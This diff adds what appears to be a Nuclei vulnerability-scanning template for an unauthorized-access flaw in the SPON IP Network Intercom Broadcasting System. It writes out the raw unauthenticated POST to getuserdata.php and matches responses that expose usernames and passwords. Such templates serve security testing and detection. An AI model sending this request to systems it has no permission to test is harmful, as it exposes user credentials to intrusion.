@@ -1,0 +1,32 @@
+id: spon-ip-network-intercom-getuserdata-unauthorized-access
+info:
+  name: SPON IP Network Intercom Broadcasting System Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    SPON IP Network Intercom Broadcasting System's getuserdata.php endpoint is vulnerable to unauthorized access, allowing retrieval of sensitive user data.
+http:
+  - raw:
+      - |
+        POST /php/getuserdata.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        jsondata[pageIndex]=0&jsondata[pageCount]=30
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"username"'
+          - '"password"'
+          - '管理员'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
